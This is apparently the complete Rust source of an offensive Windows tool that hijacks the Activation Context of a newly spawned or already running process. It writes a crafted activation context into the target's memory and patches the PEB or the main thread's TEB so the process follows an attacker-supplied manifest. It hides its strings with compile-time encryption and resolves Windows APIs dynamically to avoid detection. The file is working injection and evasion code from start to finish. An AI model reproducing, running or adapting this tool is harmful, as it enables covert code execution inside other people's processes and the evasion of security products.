#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{env, ffi::c_void, path::Path, ptr::{self, copy_nonoverlapping}};
use dinvoke_rs::data::{ClientId, ThreadBasicInformation, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PVOID};
use getopts::Options;
use ntapi::ntpebteb::{ACTIVATION_CONTEXT_STACK, TEB};
use windows::{core::PCWSTR, Wdk::Foundation::OBJECT_ATTRIBUTES, Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{ApplicationInstallationAndServicing::ACTCTXW, Diagnostics::ToolHelp::THREADENTRY32, Memory::MEMORY_BASIC_INFORMATION, Threading::{PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW}}}};

pub type GetModuleHandleW = unsafe extern "system" fn (*mut u16) -> isize;
pub type CreateActCtxW = unsafe extern "system" fn (*mut ACTCTXW) -> HANDLE;
pub type VirtualQuery = unsafe extern "system" fn (PVOID, *mut MEMORY_BASIC_INFORMATION, usize) -> usize;
pub type CreateProcessW = unsafe extern "system" fn (*const u16, *const u16, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, u32, *const c_void, *const u16, *const STARTUPINFOW, *mut PROCESS_INFORMATION) -> bool;
pub type ResumeThread = unsafe extern "system" fn (HANDLE) -> u32;

#[derive(Clone)]
#[repr(packed)] // This removes all padding, thats why we add an u32 padding field (4 bytes, to preserve alignment) in FrameListElement
struct RtlActivationContextFrame {
    _previous: *mut RtlActivationContextFrame,
    activation_context: *mut c_void,
    flags: u32
}

impl Default for RtlActivationContextFrame {
    fn default() -> RtlActivationContextFrame {
        RtlActivationContextFrame {
            _previous: ptr::null_mut(),
            activation_context: ptr::null_mut(),
            flags: 0xC // Important
        }
    }
}

#[derive(Clone)]
#[repr(C)]
struct FrameListElement {
    activation_context_frame: RtlActivationContextFrame,
    padding: u32,
    cookie: u64,
    unknown: [u8;64],
}

impl Default for FrameListElement {
    fn default() -> FrameListElement {
        FrameListElement {
            activation_context_frame: RtlActivationContextFrame::default(),
            padding: 0u32,
            cookie: 0u64,
            unknown: [0u8; 64]
        }
    }
}

#[derive(Clone)]
#[repr(C)]
struct FrameListWrapper {
   magic_bytes: u32,
   num_elements: u32,
   flink: *mut c_void,
   blink: *mut c_void,
   not_num_elements: usize,
   list_elements: [FrameListElement;32]
}

impl Default for FrameListWrapper {
    fn default() -> FrameListWrapper {
        FrameListWrapper {
           magic_bytes: 0x74736c46, // Flst
           num_elements: 1u32,
           flink: ptr::null_mut(),
           blink: ptr::null_mut(),
           not_num_elements: 0xfffffffe00000000, // 1 element (first 4 bytes are zero, last 4 bytes are not(num_elements))
           list_elements: [(); 32].map(|_| FrameListElement::default()), // The list contains a maximum of 32 elements
        }
    }
} 

// 528 bytes from the struct pointed by (handle - 8) returned by CreateActCtxW 
const TOTAL_SIZE: usize = size_of::<FrameListWrapper>() + 528;

fn main() 
{
    let args: Vec<String> = env::args().collect();
    let program = args[0].clone();
    let mut opts = Options::new();
    opts.optflag("h", "help", "Print this help menu.");
    opts.reqopt("m", "mode", "Hijack the Activation Context of a new (spawn) or an already running (hijack) process.", "");
    opts.optopt("b", "binary", "Absolute path to the executable used to spawn the new process.", "");
    opts.optopt("f", "manifest-file", "Path to the manifest file from which the new Activation Context is created.", "");
    opts.optopt("r", "resource-number", r"Resource index of the current executable where the manifest is located.", "");
    opts.optopt("i", "pid", r"PID of the process whose Activation Context is to be hijacked.", "");

    let matches = match opts.parse(&args[1..]) 
    {
        Ok(m) => { m }
        Err(_) => {print_usage(&program, opts); return; }
    };

    if matches.opt_present("h") 
    {
        print_usage(&program, opts);
        return;
    }

    if !matches.opt_present("f") && !matches.opt_present("r")
    {
        print_usage(&program, opts);
        return;
    }

    let binary_path;
    let mode = matches.opt_str("m").unwrap();
    let mut resource_index: u32 = 0;
    let mut manifest_path = String::new();
    let pid;

    if matches.opt_present("r") {
        resource_index = matches.opt_str("r").unwrap().parse().unwrap();
    } else {
        manifest_path = matches.opt_str("f").unwrap();
    }

    if mode == "spawn".to_string() 
    {
        if !matches.opt_present("b") {
            print_usage(&program, opts);
            return;
        }

        binary_path = matches.opt_str("b").unwrap();
        spawn_new_process(binary_path, resource_index, manifest_path);
    } 
    else if mode == "hijack".to_string() 
    {
        if matches.opt_present("i") {
            pid = matches.opt_str("i").unwrap().parse().unwrap();
        } else {
            print_usage(&program, opts);
            return;
        }

        hijack_process_or_thread(pid, resource_index, manifest_path);
    } 
    else {
        print_usage(&program, opts);
    }
}

fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: String) 
{
    unsafe 
    {
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let mut embedded_manifest = true;
        let mut hmodule = 0isize;

        if resource_index != 0 
        {
            let function: GetModuleHandleW;
            let ret: Option<isize>;
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("GetModuleHandleW"),function,ret,ptr::null_mut());

            if ret.unwrap() != 0 {
                hmodule = ret.unwrap();
            } else {
                println!("{}", &lc!("[x] Call to GetModuleHandleW failed."));
                return;
            }

        } 
        else 
        {
            let path = Path::new(&manifest_path);
            if !path.exists() {
                println!("{}", &lc!("[x] Manifest file not found."));
                return;
            } 

            embedded_manifest = false;
        }

        let mut context = ACTCTXW::default();
        context.cbSize = size_of::<ACTCTXW>() as u32;
        let mut manifest: Vec<u16> = manifest_path.encode_utf16().collect();
        manifest.push(0);

        if embedded_manifest 
        {
            context.dwFlags = 0x80 | 0x8; // ACTCTX_FLAG_HMODULE_VALID | ACTCTX_FLAG_RESOURCE_NAME_VALID
            context.lpResourceName = PCWSTR(resource_index as usize as *mut _); // MAKEINTRESOURCEW(resource_index)
            context.hModule.0 = hmodule;
        }
        else {
            context.lpSource = PCWSTR(manifest.as_ptr());
        }

        let function: CreateActCtxW;
        let ret: Option<HANDLE>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateActCtxW"),function,ret,&mut context);

        let context_handle = ret.unwrap();
        if context_handle.0 == -1 {
            println!("{}", &lc!("[x] Failed to create Activation Context.")); // This usually means wrong resource index or incorrect manifest file contents
            return;
        }

        println!("{}", &lc!("[+] Activation Context created locally"));

        let handle_ptr = context_handle.0 as *mut usize;
        let ac_struct_ptr = handle_ptr.add(3);
        let ac_struct_addr = *ac_struct_ptr;

        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        let function: VirtualQuery;
        let ret: Option<usize>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("VirtualQuery"),function,ret,ac_struct_addr as *mut _,&mut mbi,size_of::<MEMORY_BASIC_INFORMATION>());

        if ret.unwrap() == 0 {
            println!("{}", &lc!("[x] Call to VirtualQuery failed."));
            return;
        }

        let dwsize = mbi.RegionSize;
        let mut dst_buffer = vec![0u8;dwsize];
        let src = *ac_struct_ptr as *mut u8;
        let dst = dst_buffer.as_mut_ptr();
        copy_nonoverlapping(src, dst, dwsize);

        let mut application: Vec<u16> = binary_path.encode_utf16().collect();
        application.push(0);
        let mut startup_info: STARTUPINFOW =std::mem::zeroed() ;
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed() ;
        let function: CreateProcessW;
        let ret: Option<bool>;
        dinvoke_rs::dinvoke::dynamic_invoke!(
            k32,
            &lc!("CreateProcessW"),
            function,
            ret,
            ptr::null_mut(),
            application.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            false,
            0x00000004, // Suspended
            ptr::null_mut(),
            ptr::null(),
            &mut startup_info,
            &mut process_info
         );

        if !ret.unwrap() {
            println!("{}", &lc!("[x] New process spawn failed."));
            return;
        }

        println!("{}", &lc!("[+] New process spawned in suspended mode."));
        hijack_process(process_info.hProcess, process_info.hThread, dst, dwsize, true);
    }
}

fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: *mut u8, ac_struct_size: usize, resume_process: bool)
{
    unsafe 
    {
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));

        // Get process PEB base address
        let pi = PROCESS_BASIC_INFORMATION::default();
        let process_information: *mut c_void = std::mem::transmute(&pi);
        let ret = dinvoke_rs::dinvoke::nt_query_information_process(
            process_handle, 
            0, 
            process_information,  
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut());
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to obtain new process' PEB base address."));
            return;
        }

        println!("{}", &lc!("[+] Remote process PEB base address obtained."));

        let base_addr = usize::default();
        let base_address: *mut PVOID = std::mem::transmute(&base_addr);
        let zero_bits = 0 as usize;
        let size: *mut usize = std::mem::transmute(&ac_struct_size);

        let ret = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
            process_handle, 
            base_address, 
            zero_bits, 
            size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to allocate memory in the new process."));
            return;
        }

        println!("{}", &lc!("[+] Memory successfully allocated in the new process."));

        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            process_handle, 
            *base_address, 
            ac_struct_ptr as *mut _, 
            ac_struct_size, 
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to write the activation context data struct to the remote process."));
            return;
        }

        println!("{}", &lc!("[+] Activation Context mapped in the remote process."));

        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(process_information);
        let field_offset = (*process_information_ptr).PebBaseAddress as usize + 0x2f8 as usize; // This is the offset of PEB->ActivationContextData
        let field_offset_ptr: PVOID = std::mem::transmute(field_offset);
        let value = *base_address as usize;
        let value_ptr: PVOID = std::mem::transmute(&value);
        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            process_handle, 
            field_offset_ptr, 
            value_ptr, 
            8, // Overwrite the field to make it point to the activation context data written before
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to patch the new process PEB."));
            return;
        }

        println!("{}", &lc!("[+] PEB successfully patched."));

        if resume_process 
        {
            println!("{}", &lc!("[-] Resuming process..."));

            let function: ResumeThread;
            let _ret: Option<u32>;
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("ResumeThread"),function,_ret,thread_handle);
        }
        
    }
}

fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String) 
{
    unsafe 
    {
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let mut embedded_manifest = true;
        let mut hmodule = 0isize;

        if resource_index != 0 
        {
            let function: GetModuleHandleW;
            let ret: Option<isize>;
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("GetModuleHandleW"),function,ret,ptr::null_mut());

            if ret.unwrap() != 0 {
                hmodule = ret.unwrap();
            } else {
                println!("{}", &lc!("[x] Call to GetModuleHandleW failed."));
                return;
            }

        } 
        else 
        {
            let path = Path::new(&manifest_path);
            if !path.exists() {
                println!("{}", &lc!("[x] Manifest file not found."));
                return;
            } 

            embedded_manifest = false;
        }

        let mut context = ACTCTXW::default();
        context.cbSize = size_of::<ACTCTXW>() as u32;
        let mut manifest: Vec<u16> = manifest_path.encode_utf16().collect();
        manifest.push(0);

        if embedded_manifest 
        {
            context.dwFlags = 0x80 | 0x8; // ACTCTX_FLAG_HMODULE_VALID | ACTCTX_FLAG_RESOURCE_NAME_VALID
            context.lpResourceName = PCWSTR(resource_index as usize as *mut _); // MAKEINTRESOURCEW(resource_index)
            context.hModule.0 = hmodule;
        }
        else {
            context.lpSource = PCWSTR(manifest.as_ptr());
        }

        let function: CreateActCtxW;
        let ret: Option<HANDLE>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateActCtxW"),function,ret,&mut context);

        let context_handle = ret.unwrap();
        if context_handle.0 == -1 {
            println!("{}", &lc!("[x] Failed to create Activation Context.")); // This usually means wrong resource index or incorrect manifest file contents
            return;
        }

        println!("{}", &lc!("[+] Activation Context created locally."));

        let handle_ptr = context_handle.0 as *mut usize;
        let ac_struct_ptr = handle_ptr.add(3);
        let ac_struct_addr = *ac_struct_ptr;

        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        let function: VirtualQuery;
        let ret: Option<usize>;
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("VirtualQuery"),function,ret,ac_struct_addr as *mut _,&mut mbi,size_of::<MEMORY_BASIC_INFORMATION>());
        
        if ret.unwrap() == 0 {
            println!("{}", &lc!("[x] Call to VirtualQuery failed."));
            return;
        }

        let dwsize = mbi.RegionSize;
        let final_size = align_to_mempage(dwsize + 1);
        let mut dst_buffer = vec![0u8;final_size];
        let src = *ac_struct_ptr as *mut u8;
        let dst = dst_buffer.as_mut_ptr();
        copy_nonoverlapping(src, dst, dwsize);

        println!("{}", &lc!("[-] Looking for the remote process main thread..."));

        let tid = get_main_thread_id(pid);
        if tid == 0 
        {
            println!("{}", &lc!("[x] Main thread not found. Fallback to process' Activation Context hijack."));

            let h = HANDLE::default();
            let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
            let o = OBJECT_ATTRIBUTES::default();
            let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
            let client_id = ClientId {unique_process: HANDLE{0: pid as isize}, unique_thread: HANDLE::default()};
            let client_id: *mut ClientId = std::mem::transmute(&client_id);
            let desired_access = 0x0008 | 0x0020 ; // PROCESS_VM_OPERATION | PROCESS_VM_WRITE
            let status = dinvoke_rs::dinvoke::nt_open_process(
                handle_ptr,
                desired_access,
                object_attributes,
                client_id
            );

            if status != 0 {
                println!("{}", &lc!("[x] Failed to open a handle to the remote process.")); 
                return;
            }

            hijack_process(*handle_ptr, HANDLE::default(), dst, dwsize, false);
        }

        println!("{} {}.", &lc!("[+] Main thread detected. TID:"), tid);

        let ntdll = dinvoke_rs::dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let h = HANDLE::default();
        let thread_handle_ptr: *mut HANDLE = std::mem::transmute(&h);
        let o = OBJECT_ATTRIBUTES::default();
        let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
        let client_id = ClientId {unique_process: HANDLE::default(), unique_thread: HANDLE{0: tid as isize}};
        let client_id: *mut ClientId = std::mem::transmute(&client_id);
        let desired_access = 0x0800 ; // THREAD_QUERY_LIMITED_INFORMATION 
        let function: dinvoke_rs::data::NtOpenProcess; // NtOpenThread expects the same type of arguments as NtOpenProcess, so we can use the same function prototype
        let ret: Option<i32>;
        dinvoke_rs::dinvoke::dynamic_invoke!(ntdll,"NtOpenThread",function,ret,thread_handle_ptr,desired_access,object_attributes,client_id);

        if ret.unwrap() != 0 {
            println!("{}", &lc!("[x] Failed to open a handle to the remote process' main thread.")); 
            return;
        }

        println!("\t\\{}", &lc!("[-] Handle to main thread opened."));

        let thread_information: ThreadBasicInformation = std::mem::zeroed();
        let mut return_length: u32 = 0;
        let thread_information_ptr: PVOID = std::mem::transmute(&thread_information);
        let ntstatus = dinvoke_rs::dinvoke::nt_query_information_thread(
            *thread_handle_ptr, 
            0, 
            thread_information_ptr, 
            size_of::<ThreadBasicInformation>() as u32, 
            &mut return_length);
            
        if ntstatus != 0 {
            println!("{}", &lc!("[x] Failed to obtain remote process main thread TEB base address.")); 
            return;
        }

        let h = HANDLE::default();
        let process_handle_ptr: *mut HANDLE = std::mem::transmute(&h);
        let o = OBJECT_ATTRIBUTES::default();
        let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
        let client_id = ClientId {unique_process: HANDLE{0: pid as isize}, unique_thread: HANDLE::default()};
        let client_id: *mut ClientId = std::mem::transmute(&client_id);
        let desired_access = 0x0010 | 0x0008 | 0x0020 ; // PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
        let status = dinvoke_rs::dinvoke::nt_open_process(
            process_handle_ptr,
            desired_access,
            object_attributes,
            client_id
        );

        if status != 0 {
            println!("{}", &lc!("[x] Failed to open a handle to the remote process.")); 
            return;
        }

        let teb: TEB = std::mem::zeroed();
        let teb_ptr: *mut TEB = std::mem::transmute(&teb);
        let thread_information_ptr: *mut ThreadBasicInformation = std::mem::transmute(thread_information_ptr);
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke_rs::dinvoke::nt_read_virtual_memory(
            *process_handle_ptr, 
            (*thread_information_ptr).teb_base_address as *mut _, 
            teb_ptr as *mut _, 
            size_of::<TEB>(), 
            bytes_written
        );

        if ret != 0
        {
            println!("{} {:x}.", &lc!("[x] TEB of the remote process could not be retrieved:"), ret);
            return;
        } 

        if (*teb_ptr).ActivationStack.ActiveFrame == ptr::null_mut() { // Main thread doesn't have a custom AC, meaning we can hijack the process' main AC
            println!("\t\\{}", &lc!("[!] Main thread does not have a custom AC enabled. Hijacking process' main AC."));
            hijack_process(*process_handle_ptr, HANDLE::default(), dst, dwsize, false);
            return;
        }

        println!("\t\\{}", &lc!("[!] Main thread has a custom AC enabled. Hijacking thread's AC stack."));

        let ba = usize::default();
        let base_address: *mut PVOID = std::mem::transmute(&ba);
        let zero_bits = 0 as usize;
        let size: *mut usize = std::mem::transmute(&final_size);
        let ret = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(*process_handle_ptr, base_address, zero_bits, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if ret != 0 {
            println!("{}", &lc!("[x] Failed to allocate memory in the remote process."));
            return;
        }    

        println!("{}", &lc!("[+] Memory successfully allocated in the remote process."));
        
        let total_offset = final_size - TOTAL_SIZE; 

        let mut frame_list_wrapper = FrameListWrapper::default();
        let flink_blink = (*thread_information_ptr).teb_base_address as usize + 0x298;  // TEB->ACTIVATION_CONTEXT_STACK->FrameListCache
        frame_list_wrapper.flink = flink_blink as *mut _;
        frame_list_wrapper.blink = flink_blink as *mut _;
        frame_list_wrapper.list_elements[0].activation_context_frame.activation_context = (*base_address as usize + total_offset + size_of::<FrameListWrapper>() + 8) as *mut _; 
        frame_list_wrapper.list_elements[0].activation_context_frame.flags = 0x28;

        // This is how the cookie returned by CreateActCtx is calculated, but in any case this value does not impact in any way to the hijacking process 
        frame_list_wrapper.list_elements[0].cookie = (*teb_ptr).ActivationStack.NextCookieSequenceNumber as u64 | (((*teb_ptr).ActivationStack.StackId as u64 & 0xFFFFFFF) << 32) | 0x1000000000000000;
        let ptr_offset = dst.add(total_offset) as *mut FrameListWrapper;
        *ptr_offset = frame_list_wrapper;

        let handle_dst_ptr_start = ptr_offset.add(1) as *mut u8;
        copy_nonoverlapping((context_handle.0 as usize - 8) as *mut u8, handle_dst_ptr_start, 528); // We copy the handle right after the ACTIVATION_CONTEXT_STACK list

        let handle_dst_ptr: *mut usize = handle_dst_ptr_start as *mut usize;
        let handle_dst_ptr: *mut usize = handle_dst_ptr.add(4);
        *handle_dst_ptr = *base_address as usize; 
        
        // I don't know what this is for or if it's completely correct, but it's probably not needed at all
        let unknown_ptr = handle_dst_ptr_start.add(128) as *mut usize;
        *unknown_ptr = *base_address as usize + total_offset + size_of::<FrameListWrapper>() + 136; 

        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            *process_handle_ptr, 
            *base_address, 
            dst as *mut _, 
            final_size, 
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to write AC data in the new process."));
            return;
        }  

        println!("{}", &lc!("[+] AC data successfully written in the remote process."));

        let mut activation_stack: ACTIVATION_CONTEXT_STACK = (*teb_ptr).ActivationStack;
        activation_stack.NextCookieSequenceNumber += 1;
        activation_stack.ActiveFrame = (*base_address as usize + total_offset + 32 ) as *mut _;
        activation_stack.FrameListCache.Flink = (*base_address as usize + total_offset + 8) as *mut _; // It doesn't point to the top of the list, the first 8 bytes (magic bytes + number of elements) are skipped
        activation_stack.FrameListCache.Blink = (*base_address as usize + total_offset + 8) as *mut _;

        let activation_context_stack_addr = (*thread_information_ptr).teb_base_address as usize + 0x0290 as usize; // TEB->ACTIVATION_CONTEXT_STACK
        let activation_context_stack_ptr: PVOID = std::mem::transmute(activation_context_stack_addr);
        let value_ptr: PVOID = std::mem::transmute(&activation_stack);

        let ret = dinvoke_rs::dinvoke::nt_write_virtual_memory(
            *process_handle_ptr, 
            activation_context_stack_ptr, 
            value_ptr, 
            size_of::<ACTIVATION_CONTEXT_STACK>(), 
            bytes_written
        );

        if ret != 0 {
            println!("{}", &lc!("[x] Failed to patch TEB->ACTIVATION_CONTEXT_STACK field."));
            return;
        }  

        println!("{}", &lc!("[+] TEB->ACTIVATION_CONTEXT_STACK patched. Process completed."));
    }
    
}

fn get_main_thread_id(pid: u32) -> u32
{
    unsafe
    {
        let func: dinvoke_rs::data::CreateToolhelp32Snapshot;
        let ret: Option<HANDLE>;
        let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("CreateToolhelp32Snapshot"),func,ret,0x00000004,0); //TH32CS_SNAPTHREAD

        let snapshot = ret.unwrap();
        let mut te32: THREADENTRY32 = THREADENTRY32::default();
        te32.dwSize = size_of::<THREADENTRY32>() as u32;

        let f: dinvoke_rs::data::Thread32First;
        let r: Option<bool>;
        let te32_ptr: *mut THREADENTRY32 = std::mem::transmute(&te32);
        dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("Thread32First"),f,r,snapshot,te32_ptr);

        if !r.unwrap()
        {
            println!("{}",&lc!("[x] Call to Thread32First failed."));
            return 0;
        } 

        loop 
        {
            if te32.th32OwnerProcessID == pid { // First thread is usually the process' main thread
                return te32.th32ThreadID;
            }

            let func: dinvoke_rs::data::Thread32Next;
            let ret: Option<bool>;
            let te32_ptr: *mut THREADENTRY32 = std::mem::transmute(&te32);
            dinvoke_rs::dinvoke::dynamic_invoke!(k32,&lc!("Thread32Next"),func,ret,snapshot,te32_ptr);
            if !ret.unwrap() {
                break;
            } 

        }
    }

    0

}

fn align_to_mempage(vsize: usize) -> usize {

    if vsize % 4096 == 0 {
        return vsize;
    } else {
        return ((vsize / 4096) + 1) * 4096;
    }
}

fn print_usage(program: &str, opts: Options) {
    let brief = format!(r"Usage: {} -m spawn|hijack -b C:\Windows\System32\rdpclip.exe -r 3 [options]", program);
    print!("{}", opts.usage(&brief));
}
